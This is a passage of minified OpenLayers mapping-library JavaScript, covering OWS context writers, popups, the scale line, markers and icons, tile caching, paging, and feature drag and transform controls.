this.createElementNSPlus(\"Name\",{value:a.name})},Title:function(a){return this.createElementNSPlus(\"Title\",\n{value:a.title})},LegendURL:function(a){var b=this.createElementNSPlus(\"LegendURL\");this.writeNode(\"OnlineResource\",a.legend,b);return b},_WMS:function(a){var b=this.createElementNSPlus(\"Layer\",{attributes:{name:a.params.LAYERS,queryable:a.queryable?\"1\":\"0\",hidden:a.visibility?\"0\":\"1\",opacity:a.hasOwnProperty(\"opacity\")?a.opacity:null}});this.writeNode(\"ows:Title\",a.name,b);this.writeNode(\"ows:OutputFormat\",a.params.FORMAT,b);this.writeNode(\"Server\",{service:OpenLayers.Format.Context.serviceTypes.WMS,\nversion:a.params.VERSION,url:a.url},b);a.metadata.styles&&0<a.metadata.styles.length&&this.writeNode(\"StyleList\",a.metadata.styles,b);return b},_Layer:function(a){var b,c,d;b=a.layer;c=a.subPaths;d=null;0<c.length?(b=c[0].join(\"/\"),c=b.lastIndexOf(\"/\"),d=this.nestingLayerLookup[b],c=0<c?b.substring(c+1,b.length):b,d||(d=this.createElementNSPlus(\"Layer\"),this.writeNode(\"ows:Title\",c,d),this.nestingLayerLookup[b]=d),a.subPaths.shift(),this.writeNode(\"_Layer\",a,d)):(b instanceof OpenLayers.Layer.WMS?\nd=this.writeNode(\"_WMS\",b):b instanceof OpenLayers.Layer.Vector&&(b.protocol instanceof OpenLayers.Protocol.WFS.v1?d=this.writeNode(\"_WFS\",b):b.protocol instanceof OpenLayers.Protocol.HTTP?b.protocol.format instanceof OpenLayers.Format.GML?(b.protocol.format.version=\"2.1.2\",d=this.writeNode(\"_GML\",b)):b.protocol.format instanceof OpenLayers.Format.KML&&(b.protocol.format.version=\"2.2\",d=this.writeNode(\"_KML\",b)):(this.setNamespace(\"feature\",this.featureNS),d=this.writeNode(\"_InlineGeometry\",b))),\nb.options.maxScale&&this.writeNode(\"sld:MinScaleDenominator\",b.options.maxScale,d),b.options.minScale&&this.writeNode(\"sld:MaxScaleDenominator\",b.options.minScale,d),this.nestingLayerLookup[b.name]=d);return d},_WFS:function(a){var b=this.createElementNSPlus(\"Layer\",{attributes:{name:a.protocol.featurePrefix+\":\"+a.protocol.featureType,hidden:a.visibility?\"0\":\"1\"}});this.writeNode(\"ows:Title\",a.name,b);this.writeNode(\"Server\",{service:OpenLayers.Format.Context.serviceTypes.WFS,version:a.protocol.version,\nurl:a.protocol.url},b);return b},_InlineGeometry:function(a){var b=this.createElementNSPlus(\"Layer\",{attributes:{name:this.featureType,hidden:a.visibility?\"0\":\"1\"}});this.writeNode(\"ows:Title\",a.name,b);this.writeNode(\"InlineGeometry\",a,b);return b},_GML:function(a){var b=this.createElementNSPlus(\"Layer\");this.writeNode(\"ows:Title\",a.name,b);this.writeNode(\"Server\",{service:OpenLayers.Format.Context.serviceTypes.GML,url:a.protocol.url,version:a.protocol.format.version},b);return b},_KML:function(a){var b=\nthis.createElementNSPlus(\"Layer\");this.writeNode(\"ows:Title\",a.name,b);this.writeNode(\"Server\",{service:OpenLayers.Format.Context.serviceTypes.KML,version:a.protocol.format.version,url:a.protocol.url},b);return b}},gml:OpenLayers.Util.applyDefaults({boundedBy:function(a){var b=this.createElementNSPlus(\"gml:boundedBy\");this.writeNode(\"gml:Box\",a,b);return b}},OpenLayers.Format.GML.v2.prototype.writers.gml),ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.writers.ows,sld:OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld,\nfeature:OpenLayers.Format.GML.v2.prototype.writers.feature},CLASS_NAME:\"OpenLayers.Format.OWSContext.v0_3_1\"});OpenLayers.Popup=OpenLayers.Class({events:null,id:\"\",lonlat:null,div:null,contentSize:null,size:null,contentHTML:null,backgroundColor:\"\",opacity:\"\",border:\"\",contentDiv:null,groupDiv:null,closeDiv:null,autoSize:!1,minSize:null,maxSize:null,displayClass:\"olPopup\",contentDisplayClass:\"olPopupContent\",padding:0,disableFirefoxOverflowHack:!1,fixPadding:function(){\"number\"==typeof this.padding&&(this.padding=new OpenLayers.Bounds(this.padding,this.padding,this.padding,this.padding))},panMapIfOutOfView:!1,\nkeepInMap:!1,closeOnMove:!1,map:null,initialize:function(a,b,c,d,e,f){null==a&&(a=OpenLayers.Util.createUniqueID(this.CLASS_NAME+\"_\"));this.id=a;this.lonlat=b;this.contentSize=null!=c?c:new OpenLayers.Size(OpenLayers.Popup.WIDTH,OpenLayers.Popup.HEIGHT);null!=d&&(this.contentHTML=d);this.backgroundColor=OpenLayers.Popup.COLOR;this.opacity=OpenLayers.Popup.OPACITY;this.border=OpenLayers.Popup.BORDER;this.div=OpenLayers.Util.createDiv(this.id,null,null,null,null,null,\"hidden\");this.div.className=this.displayClass;\nthis.groupDiv=OpenLayers.Util.createDiv(this.id+\"_GroupDiv\",null,null,null,\"relative\",null,\"hidden\");a=this.div.id+\"_contentDiv\";this.contentDiv=OpenLayers.Util.createDiv(a,null,this.contentSize.clone(),null,\"relative\");this.contentDiv.className=this.contentDisplayClass;this.groupDiv.appendChild(this.contentDiv);this.div.appendChild(this.groupDiv);e&&this.addCloseBox(f);this.registerEvents()},destroy:function(){this.border=this.opacity=this.backgroundColor=this.contentHTML=this.size=this.lonlat=this.id=\nnull;this.closeOnMove&&this.map&&this.map.events.unregister(\"movestart\",this,this.hide);this.events.destroy();this.events=null;this.closeDiv&&(OpenLayers.Event.stopObservingElement(this.closeDiv),this.groupDiv.removeChild(this.closeDiv));this.closeDiv=null;this.div.removeChild(this.groupDiv);this.groupDiv=null;null!=this.map&&this.map.removePopup(this);this.panMapIfOutOfView=this.padding=this.maxSize=this.minSize=this.autoSize=this.div=this.map=null},draw:function(a){null==a&&null!=this.lonlat&&null!=\nthis.map&&(a=this.map.getLayerPxFromLonLat(this.lonlat));this.closeOnMove&&this.map.events.register(\"movestart\",this,this.hide);this.disableFirefoxOverflowHack||\"firefox\"!=OpenLayers.BROWSER_NAME||(this.map.events.register(\"movestart\",this,function(){var a=document.defaultView.getComputedStyle(this.contentDiv,null).getPropertyValue(\"overflow\");\"hidden\"!=a&&(this.contentDiv._oldOverflow=a,this.contentDiv.style.overflow=\"hidden\")}),this.map.events.register(\"moveend\",this,function(){var a=this.contentDiv._oldOverflow;\na&&(this.contentDiv.style.overflow=a,this.contentDiv._oldOverflow=null)}));this.moveTo(a);this.autoSize||this.size||this.setSize(this.contentSize);this.setBackgroundColor();this.setOpacity();this.setBorder();this.setContentHTML();this.panMapIfOutOfView&&this.panIntoView();return this.div},updatePosition:function(){if(this.lonlat&&this.map){var a=this.map.getLayerPxFromLonLat(this.lonlat);a&&this.moveTo(a)}},moveTo:function(a){null!=a&&null!=this.div&&(this.div.style.left=a.x+\"px\",this.div.style.top=\na.y+\"px\")},visible:function(){return OpenLayers.Element.visible(this.div)},toggle:function(){this.visible()?this.hide():this.show()},show:function(){this.div.style.display=\"\";this.panMapIfOutOfView&&this.panIntoView()},hide:function(){this.div.style.display=\"none\"},setSize:function(a){this.size=a.clone();var b=this.getContentDivPadding(),c=b.left+b.right,d=b.top+b.bottom;this.fixPadding();c+=this.padding.left+this.padding.right;d+=this.padding.top+this.padding.bottom;if(this.closeDiv)var e=parseInt(this.closeDiv.style.width),\nc=c+(e+b.right);this.size.w+=c;this.size.h+=d;\"msie\"==OpenLayers.BROWSER_NAME&&(this.contentSize.w+=b.left+b.right,this.contentSize.h+=b.bottom+b.top);null!=this.div&&(this.div.style.width=this.size.w+\"px\",this.div.style.height=this.size.h+\"px\");null!=this.contentDiv&&(this.contentDiv.style.width=a.w+\"px\",this.contentDiv.style.height=a.h+\"px\")},updateSize:function(){var a=\"<div class='\"+this.contentDisplayClass+\"'>\"+this.contentDiv.innerHTML+\"</div>\",b=this.map?this.map.div:document.body,c=OpenLayers.Util.getRenderedDimensions(a,\nnull,{displayClass:this.displayClass,containerElement:b}),d=this.getSafeContentSize(c),e=null;d.equals(c)?e=c:(c={w:d.w<c.w?d.w:null,h:d.h<c.h?d.h:null},c.w&&c.h?e=d:(a=OpenLayers.Util.getRenderedDimensions(a,c,{displayClass:this.contentDisplayClass,containerElement:b}),\"hidden\"!=OpenLayers.Element.getStyle(this.contentDiv,\"overflow\")&&a.equals(d)&&(d=OpenLayers.Util.getScrollbarWidth(),c.w?a.h+=d:a.w+=d),e=this.getSafeContentSize(a)));this.setSize(e)},setBackgroundColor:function(a){void 0!=a&&(this.backgroundColor=\na);null!=this.div&&(this.div.style.backgroundColor=this.backgroundColor)},setOpacity:function(a){void 0!=a&&(this.opacity=a);null!=this.div&&(this.div.style.opacity=this.opacity,this.div.style.filter=\"alpha(opacity=\"+100*this.opacity+\")\")},setBorder:function(a){void 0!=a&&(this.border=a);null!=this.div&&(this.div.style.border=this.border)},setContentHTML:function(a){null!=a&&(this.contentHTML=a);null!=this.contentDiv&&(null!=this.contentHTML&&this.contentHTML!=this.contentDiv.innerHTML)&&(this.contentDiv.innerHTML=\nthis.contentHTML,this.autoSize&&(this.registerImageListeners(),this.updateSize()))},registerImageListeners:function(){for(var a=function(){null!==this.popup.id&&(this.popup.updateSize(),this.popup.visible()&&this.popup.panMapIfOutOfView&&this.popup.panIntoView(),OpenLayers.Event.stopObserving(this.img,\"load\",this.img._onImgLoad))},b=this.contentDiv.getElementsByTagName(\"img\"),c=0,d=b.length;c<d;c++){var e=b[c];if(0==e.width||0==e.height)e._onImgLoad=OpenLayers.Function.bind(a,{popup:this,img:e}),\nOpenLayers.Event.observe(e,\"load\",e._onImgLoad)}},getSafeContentSize:function(a){a=a.clone();var b=this.getContentDivPadding(),c=b.left+b.right,d=b.top+b.bottom;this.fixPadding();c+=this.padding.left+this.padding.right;d+=this.padding.top+this.padding.bottom;if(this.closeDiv)var e=parseInt(this.closeDiv.style.width),c=c+(e+b.right);this.minSize&&(a.w=Math.max(a.w,this.minSize.w-c),a.h=Math.max(a.h,this.minSize.h-d));this.maxSize&&(a.w=Math.min(a.w,this.maxSize.w-c),a.h=Math.min(a.h,this.maxSize.h-\nd));if(this.map&&this.map.size){e=b=0;if(this.keepInMap&&!this.panMapIfOutOfView)switch(e=this.map.getPixelFromLonLat(this.lonlat),this.relativePosition){case \"tr\":b=e.x;e=this.map.size.h-e.y;break;case \"tl\":b=this.map.size.w-e.x;e=this.map.size.h-e.y;break;case \"bl\":b=this.map.size.w-e.x;e=e.y;break;case \"br\":b=e.x;e=e.y;break;default:b=e.x,e=this.map.size.h-e.y}d=this.map.size.h-this.map.paddingForPopups.top-this.map.paddingForPopups.bottom-d-e;a.w=Math.min(a.w,this.map.size.w-this.map.paddingForPopups.left-\nthis.map.paddingForPopups.right-c-b);a.h=Math.min(a.h,d)}return a},getContentDivPadding:function(){var a=this._contentDivPadding;a||(null==this.div.parentNode&&(this.div.style.display=\"none\",document.body.appendChild(this.div)),this._contentDivPadding=a=new OpenLayers.Bounds(OpenLayers.Element.getStyle(this.contentDiv,\"padding-left\"),OpenLayers.Element.getStyle(this.contentDiv,\"padding-bottom\"),OpenLayers.Element.getStyle(this.contentDiv,\"padding-right\"),OpenLayers.Element.getStyle(this.contentDiv,\n\"padding-top\")),this.div.parentNode==document.body&&(document.body.removeChild(this.div),this.div.style.display=\"\"));return a},addCloseBox:function(a){this.closeDiv=OpenLayers.Util.createDiv(this.id+\"_close\",null,{w:17,h:17});this.closeDiv.className=\"olPopupCloseBox\";var b=this.getContentDivPadding();this.closeDiv.style.right=b.right+\"px\";this.closeDiv.style.top=b.top+\"px\";this.groupDiv.appendChild(this.closeDiv);a=a||function(a){this.hide();OpenLayers.Event.stop(a)};OpenLayers.Event.observe(this.closeDiv,\n\"touchend\",OpenLayers.Function.bindAsEventListener(a,this));OpenLayers.Event.observe(this.closeDiv,\"click\",OpenLayers.Function.bindAsEventListener(a,this))},panIntoView:function(){var a=this.map.getSize(),b=this.map.getViewPortPxFromLayerPx(new OpenLayers.Pixel(parseInt(this.div.style.left),parseInt(this.div.style.top))),c=b.clone();b.x<this.map.paddingForPopups.left?c.x=this.map.paddingForPopups.left:b.x+this.size.w>a.w-this.map.paddingForPopups.right&&(c.x=a.w-this.map.paddingForPopups.right-this.size.w);\nb.y<this.map.paddingForPopups.top?c.y=this.map.paddingForPopups.top:b.y+this.size.h>a.h-this.map.paddingForPopups.bottom&&(c.y=a.h-this.map.paddingForPopups.bottom-this.size.h);this.map.pan(b.x-c.x,b.y-c.y)},registerEvents:function(){this.events=new OpenLayers.Events(this,this.div,null,!0);this.events.on({mousedown:this.onmousedown,mousemove:this.onmousemove,mouseup:this.onmouseup,click:this.onclick,mouseout:this.onmouseout,dblclick:this.ondblclick,touchstart:function(a){OpenLayers.Event.stop(a,!0)},\nscope:this})},onmousedown:function(a){this.mousedown=!0;OpenLayers.Event.stop(a,!0)},onmousemove:function(a){this.mousedown&&OpenLayers.Event.stop(a,!0)},onmouseup:function(a){this.mousedown&&(this.mousedown=!1,OpenLayers.Event.stop(a,!0))},onclick:function(a){OpenLayers.Event.stop(a,!0)},onmouseout:function(a){this.mousedown=!1},ondblclick:function(a){OpenLayers.Event.stop(a,!0)},CLASS_NAME:\"OpenLayers.Popup\"});OpenLayers.Popup.WIDTH=200;OpenLayers.Popup.HEIGHT=200;OpenLayers.Popup.COLOR=\"white\";\nOpenLayers.Popup.OPACITY=1;OpenLayers.Popup.BORDER=\"0px\";OpenLayers.Control.ScaleLine=OpenLayers.Class(OpenLayers.Control,{maxWidth:100,topOutUnits:\"km\",topInUnits:\"m\",bottomOutUnits:\"mi\",bottomInUnits:\"ft\",eTop:null,eBottom:null,geodesic:!1,draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.eTop||(this.eTop=document.createElement(\"div\"),this.eTop.className=this.displayClass+\"Top\",this.div.appendChild(this.eTop),this.eTop.style.visibility=\"\"==this.topOutUnits||\"\"==this.topInUnits?\"hidden\":\"visible\",this.eBottom=document.createElement(\"div\"),\nthis.eBottom.className=this.displayClass+\"Bottom\",this.div.appendChild(this.eBottom),this.eBottom.style.visibility=\"\"==this.bottomOutUnits||\"\"==this.bottomInUnits?\"hidden\":\"visible\");this.map.events.register(\"moveend\",this,this.update);this.update();return this.div},getBarLen:function(a){var b=parseInt(Math.log(a)/Math.log(10)),b=Math.pow(10,b);a=parseInt(a/b);return(5<a?5:2<a?2:1)*b},update:function(){var a=this.map.getResolution();if(a){var b=this.map.getUnits(),c=OpenLayers.INCHES_PER_UNIT,d=this.maxWidth*\na*c[b],e=1;!0===this.geodesic&&(e=(this.map.getGeodesicPixelSize().w||1E-6)*this.maxWidth/(d/c.km),d*=e);var f,g;1E5<d?(f=this.topOutUnits,g=this.bottomOutUnits):(f=this.topInUnits,g=this.bottomInUnits);var h=d/c[f],k=d/c[g],d=this.getBarLen(h),l=this.getBarLen(k),h=d/c[b]*c[f],k=l/c[b]*c[g],b=h/a/e,a=k/a/e;\"visible\"==this.eBottom.style.visibility&&(this.eBottom.style.width=Math.round(a)+\"px\",this.eBottom.innerHTML=l+\" \"+g);\"visible\"==this.eTop.style.visibility&&(this.eTop.style.width=Math.round(b)+\n\"px\",this.eTop.innerHTML=d+\" \"+f)}},CLASS_NAME:\"OpenLayers.Control.ScaleLine\"});OpenLayers.Icon=OpenLayers.Class({url:null,size:null,offset:null,calculateOffset:null,imageDiv:null,px:null,initialize:function(a,b,c,d){this.url=a;this.size=b||{w:20,h:20};this.offset=c||{x:-(this.size.w/2),y:-(this.size.h/2)};this.calculateOffset=d;a=OpenLayers.Util.createUniqueID(\"OL_Icon_\");this.imageDiv=OpenLayers.Util.createAlphaImageDiv(a)},destroy:function(){this.erase();OpenLayers.Event.stopObservingElement(this.imageDiv.firstChild);this.imageDiv.innerHTML=\"\";this.imageDiv=null},clone:function(){return new OpenLayers.Icon(this.url,\nthis.size,this.offset,this.calculateOffset)},setSize:function(a){null!=a&&(this.size=a);this.draw()},setUrl:function(a){null!=a&&(this.url=a);this.draw()},draw:function(a){OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,null,this.size,this.url,\"absolute\");this.moveTo(a);return this.imageDiv},erase:function(){null!=this.imageDiv&&null!=this.imageDiv.parentNode&&OpenLayers.Element.remove(this.imageDiv)},setOpacity:function(a){OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,null,null,null,\nnull,null,null,a)},moveTo:function(a){null!=a&&(this.px=a);null!=this.imageDiv&&(null==this.px?this.display(!1):(this.calculateOffset&&(this.offset=this.calculateOffset(this.size)),OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,{x:this.px.x+this.offset.x,y:this.px.y+this.offset.y})))},display:function(a){this.imageDiv.style.display=a?\"\":\"none\"},isDrawn:function(){return this.imageDiv&&this.imageDiv.parentNode&&11!=this.imageDiv.parentNode.nodeType},CLASS_NAME:\"OpenLayers.Icon\"});OpenLayers.Marker=OpenLayers.Class({icon:null,lonlat:null,events:null,map:null,initialize:function(a,b){this.lonlat=a;var c=b?b:OpenLayers.Marker.defaultIcon();null==this.icon?this.icon=c:(this.icon.url=c.url,this.icon.size=c.size,this.icon.offset=c.offset,this.icon.calculateOffset=c.calculateOffset);this.events=new OpenLayers.Events(this,this.icon.imageDiv)},destroy:function(){this.erase();this.map=null;this.events.destroy();this.events=null;null!=this.icon&&(this.icon.destroy(),this.icon=null)},\ndraw:function(a){return this.icon.draw(a)},erase:function(){null!=this.icon&&this.icon.erase()},moveTo:function(a){null!=a&&null!=this.icon&&this.icon.moveTo(a);this.lonlat=this.map.getLonLatFromLayerPx(a)},isDrawn:function(){return this.icon&&this.icon.isDrawn()},onScreen:function(){var a=!1;this.map&&(a=this.map.getExtent().containsLonLat(this.lonlat));return a},inflate:function(a){this.icon&&this.icon.setSize({w:this.icon.size.w*a,h:this.icon.size.h*a})},setOpacity:function(a){this.icon.setOpacity(a)},\nsetUrl:function(a){this.icon.setUrl(a)},display:function(a){this.icon.display(a)},CLASS_NAME:\"OpenLayers.Marker\"});OpenLayers.Marker.defaultIcon=function(){return new OpenLayers.Icon(OpenLayers.Util.getImageLocation(\"marker.png\"),{w:21,h:25},{x:-10.5,y:-25})};OpenLayers.Layer.TileCache=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,format:\"image/png\",serverResolutions:null,initialize:function(a,b,c,d){this.layername=c;OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,{},d]);this.extension=this.format.split(\"/\")[1].toLowerCase();this.extension=\"jpg\"==this.extension?\"jpeg\":this.extension},clone:function(a){null==a&&(a=new OpenLayers.Layer.TileCache(this.name,this.url,this.layername,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,\n[a])},getURL:function(a){var b=this.getServerResolution(),c=this.maxExtent,d=this.tileSize,e=Math.round((a.left-c.left)/(b*d.w));a=Math.round((a.bottom-c.bottom)/(b*d.h));b=null!=this.serverResolutions?OpenLayers.Util.indexOf(this.serverResolutions,b):this.map.getZoom();e=[this.layername,OpenLayers.Number.zeroPad(b,2),OpenLayers.Number.zeroPad(parseInt(e/1E6),3),OpenLayers.Number.zeroPad(parseInt(e/1E3)%1E3,3),OpenLayers.Number.zeroPad(parseInt(e)%1E3,3),OpenLayers.Number.zeroPad(parseInt(a/1E6),\n3),OpenLayers.Number.zeroPad(parseInt(a/1E3)%1E3,3),OpenLayers.Number.zeroPad(parseInt(a)%1E3,3)+\".\"+this.extension].join(\"/\");b=this.url;OpenLayers.Util.isArray(b)&&(b=this.selectUrl(e,b));b=\"/\"==b.charAt(b.length-1)?b:b+\"/\";return b+e},CLASS_NAME:\"OpenLayers.Layer.TileCache\"});OpenLayers.Strategy.Paging=OpenLayers.Class(OpenLayers.Strategy,{features:null,length:10,num:null,paging:!1,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);if(a)this.layer.events.on({beforefeaturesadded:this.cacheFeatures,scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&&(this.clearCache(),this.layer.events.un({beforefeaturesadded:this.cacheFeatures,scope:this}));return a},cacheFeatures:function(a){this.paging||(this.clearCache(),\nthis.features=a.features,this.pageNext(a))},clearCache:function(){if(this.features)for(var a=0;a<this.features.length;++a)this.features[a].destroy();this.num=this.features=null},pageCount:function(){return Math.ceil((this.features?this.features.length:0)/this.length)},pageNum:function(){return this.num},pageLength:function(a){a&&0<a&&(this.length=a);return this.length},pageNext:function(a){var b=!1;this.features&&(null===this.num&&(this.num=-1),b=this.page((this.num+1)*this.length,a));return b},pagePrevious:function(){var a=\n!1;this.features&&(null===this.num&&(this.num=this.pageCount()),a=this.page((this.num-1)*this.length));return a},page:function(a,b){var c=!1;if(this.features&&0<=a&&a<this.features.length){var d=Math.floor(a/this.length);d!=this.num&&(this.paging=!0,c=this.features.slice(a,a+this.length),this.layer.removeFeatures(this.layer.features),this.num=d,b&&b.features?b.features=c:this.layer.addFeatures(c),this.paging=!1,c=!0)}return c},CLASS_NAME:\"OpenLayers.Strategy.Paging\"});OpenLayers.Control.DragFeature=OpenLayers.Class(OpenLayers.Control,{geometryTypes:null,onStart:function(a,b){},onDrag:function(a,b){},onComplete:function(a,b){},onEnter:function(a){},onLeave:function(a){},documentDrag:!1,layer:null,feature:null,dragCallbacks:{},featureCallbacks:{},lastPixel:null,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.layer=a;this.handlers={drag:new OpenLayers.Handler.Drag(this,OpenLayers.Util.extend({down:this.downFeature,move:this.moveFeature,\nup:this.upFeature,out:this.cancel,done:this.doneDragging},this.dragCallbacks),{documentDrag:this.documentDrag}),feature:new OpenLayers.Handler.Feature(this,this.layer,OpenLayers.Util.extend({click:this.clickFeature,clickout:this.clickoutFeature,over:this.overFeature,out:this.outFeature},this.featureCallbacks),{geometryTypes:this.geometryTypes})}},clickFeature:function(a){this.handlers.feature.touch&&(!this.over&&this.overFeature(a))&&(this.handlers.drag.dragstart(this.handlers.feature.evt),this.handlers.drag.stopDown=\n!1)},clickoutFeature:function(a){this.handlers.feature.touch&&this.over&&(this.outFeature(a),this.handlers.drag.stopDown=!0)},destroy:function(){this.layer=null;OpenLayers.Control.prototype.destroy.apply(this,[])},activate:function(){return this.handlers.feature.activate()&&OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){this.handlers.drag.deactivate();this.handlers.feature.deactivate();this.feature=null;this.dragging=!1;this.lastPixel=null;OpenLayers.Element.removeClass(this.map.viewPortDiv,\nthis.displayClass+\"Over\");return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},overFeature:function(a){var b=!1;this.handlers.drag.dragging?this.over=this.feature.id==a.id?!0:!1:(this.feature=a,this.handlers.drag.activate(),this.over=b=!0,OpenLayers.Element.addClass(this.map.viewPortDiv,this.displayClass+\"Over\"),this.onEnter(a));return b},downFeature:function(a){this.lastPixel=a;this.onStart(this.feature,a)},moveFeature:function(a){var b=this.map.getResolution();this.feature.geometry.move(b*\n(a.x-this.lastPixel.x),b*(this.lastPixel.y-a.y));this.layer.drawFeature(this.feature);this.lastPixel=a;this.onDrag(this.feature,a)},upFeature:function(a){this.over||this.handlers.drag.deactivate()},doneDragging:function(a){this.onComplete(this.feature,a)},outFeature:function(a){this.handlers.drag.dragging?this.feature.id==a.id&&(this.over=!1):(this.over=!1,this.handlers.drag.deactivate(),OpenLayers.Element.removeClass(this.map.viewPortDiv,this.displayClass+\"Over\"),this.onLeave(a),this.feature=null)},\ncancel:function(){this.handlers.drag.deactivate();this.over=!1},setMap:function(a){this.handlers.drag.setMap(a);this.handlers.feature.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Control.DragFeature\"});OpenLayers.Control.TransformFeature=OpenLayers.Class(OpenLayers.Control,{geometryTypes:null,layer:null,preserveAspectRatio:!1,rotate:!0,feature:null,renderIntent:\"temporary\",rotationHandleSymbolizer:null,box:null,center:null,scale:1,ratio:1,rotation:0,handles:null,rotationHandles:null,dragControl:null,irregular:!1,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.layer=a;this.rotationHandleSymbolizer||(this.rotationHandleSymbolizer={stroke:!1,pointRadius:10,fillOpacity:0,\ncursor:\"pointer\"});this.createBox();this.createControl()},activate:function(){var a=!1;OpenLayers.Control.prototype.activate.apply(this,arguments)&&(this.dragControl.activate(),this.layer.addFeatures([this.box]),this.rotate&&this.layer.addFeatures(this.rotationHandles),this.layer.addFeatures(this.handles),a=!0);return a},deactivate:function(){var a=!1;OpenLayers.Control.prototype.deactivate.apply(this,arguments)&&(this.layer.removeFeatures(this.handles),this.rotate&&this.layer.removeFeatures(this.rotationHandles),\nthis.layer.removeFeatures([this.box]),this.dragControl.deactivate(),a=!0);return a},setMap:function(a){this.dragControl.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},setFeature:function(a,b){b=OpenLayers.Util.applyDefaults(b,{rotation:0,scale:1,ratio:1});var c=this.rotation,d=this.center;OpenLayers.Util.extend(this,b);if(!1!==this.events.triggerEvent(\"beforesetfeature\",{feature:a})){this.feature=a;this.activate();this._setfeature=!0;var e=this.feature.geometry.getBounds();this.box.move(e.getCenterLonLat());\nthis.box.geometry.rotate(-c,d);this._angle=0;this.rotation?(c=a.geometry.clone(),c.rotate(-this.rotation,this.center),c=new OpenLayers.Feature.Vector(c.getBounds().toGeometry()),c.geometry.rotate(this.rotation,this.center),this.box.geometry.rotate(this.rotation,this.center),this.box.move(c.geometry.getBounds().getCenterLonLat()),c=c.geometry.components[0].components[0].getBounds().getCenterLonLat()):c=new OpenLayers.LonLat(e.left,e.bottom);this.handles[0].move(c);delete this._setfeature;this.events.triggerEvent(\"setfeature\",\n{feature:a})}},unsetFeature:function(){this.active?this.deactivate():(this.feature=null,this.rotation=0,this.ratio=this.scale=1)},createBox:function(){var a=this;this.center=new OpenLayers.Geometry.Point(0,0);this.box=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString([new OpenLayers.Geometry.Point(-1,-1),new OpenLayers.Geometry.Point(0,-1),new OpenLayers.Geometry.Point(1,-1),new OpenLayers.Geometry.Point(1,0),new OpenLayers.Geometry.Point(1,1),new OpenLayers.Geometry.Point(0,1),new OpenLayers.Geometry.Point(-1,\n1),new OpenLayers.Geometry.Point(-1,0),new OpenLayers.Geometry.Point(-1,-1)]),null,\"string\"==typeof this.renderIntent?null:this.renderIntent);this.box.geometry.move=function(b,c){a._moving=!0;OpenLayers.Geometry.LineString.prototype.move.apply(this,arguments);a.center.move(b,c);delete a._moving};for(var b=function(a,b){OpenLayers.Geometry.Point.prototype.move.apply(this,arguments);this._rotationHandle&&this._rotationHandle.geometry.move(a,b);this._handle.geometry.move(a,b)},c=function(a,b,c){OpenLayers.Geometry.Point.prototype.resize.apply(this,\narguments);this._rotationHandle&&this._rotationHandle.geometry.resize(a,b,c);this._handle.geometry.resize(a,b,c)},d=function(a,b){OpenLayers.Geometry.Point.prototype.rotate.apply(this,arguments);this._rotationHandle&&this._rotationHandle.geometry.rotate(a,b);this._handle.geometry.rotate(a,b)},e=function(b,c){var d=this.x,e=this.y;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);if(!a._moving){var f=a.dragControl.handlers.drag.evt,g=!(!a._setfeature&&a.preserveAspectRatio)&&!(f&&f.shiftKey),\nh=new OpenLayers.Geometry.Point(d,e),f=a.center;this.rotate(-a.rotation,f);h.rotate(-a.rotation,f);var k=this.x-f.x,l=this.y-f.y,m=k-(this.x-h.x),n=l-(this.y-h.y);a.irregular&&!a._setfeature&&(k-=(this.x-h.x)/2,l-=(this.y-h.y)/2);this.x=d;this.y=e;h=1;g?(l=1E-5>Math.abs(n)?1:l/n,h=(1E-5>Math.abs(m)?1:k/m)/l):(m=Math.sqrt(m*m+n*n),l=Math.sqrt(k*k+l*l)/m);a._moving=!0;a.box.geometry.rotate(-a.rotation,f);delete a._moving;a.box.geometry.resize(l,f,h);a.box.geometry.rotate(a.rotation,f);a.transformFeature({scale:l,\nratio:h});a.irregular&&!a._setfeature&&(k=f.clone(),k.x+=1E-5>Math.abs(d-f.x)?0:this.x-d,k.y+=1E-5>Math.abs(e-f.y)?0:this.y-e,a.box.geometry.move(this.x-d,this.y-e),a.transformFeature({center:k}))}},f=function(b,c){var d=this.x,e=this.y;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);if(!a._moving){var f=a.dragControl.handlers.drag.evt,f=f&&f.shiftKey?45:1,g=a.center,h=this.x-g.x,k=this.y-g.y;this.x=d;this.y=e;d=Math.atan2(k-c,h-b);d=Math.atan2(k,h)-d;d*=180/Math.PI;a._angle=(a._angle+d)%\n360;d=a.rotation%f;if(Math.abs(a._angle)>=f||0!==d)d=Math.round(a._angle/f)*f-d,a._angle=0,a.box.geometry.rotate(d,g),a.transformFeature({rotation:d})}},g=Array(8),h=Array(4),k,l,m,n=\"sw s se e ne n nw w\".split(\" \"),p=0;8>p;++p)k=this.box.geometry.components[p],l=new OpenLayers.Feature.Vector(k.clone(),{role:n[p]+\"-resize\"},\"string\"==typeof this.renderIntent?null:this.renderIntent),0==p%2&&(m=new OpenLayers.Feature.Vector(k.clone(),{role:n[p]+\"-rotate\"},\"string\"==typeof this.rotationHandleSymbolizer?\nnull:this.rotationHandleSymbolizer),m.geometry.move=f,k._rotationHandle=m,h[p/2]=m),k.move=b,k.resize=c,k.rotate=d,l.geometry.move=e,k._handle=l,g[p]=l;this.rotationHandles=h;this.handles=g},createControl:function(){var a=this;this.dragControl=new OpenLayers.Control.DragFeature(this.layer,{documentDrag:!0,moveFeature:function(b){this.feature===a.feature&&(this.feature=a.box);OpenLayers.Control.DragFeature.prototype.moveFeature.apply(this,arguments)},onDrag:function(b,c){b===a.box&&a.transformFeature({center:a.center})},\nonStart:function(b,c){var 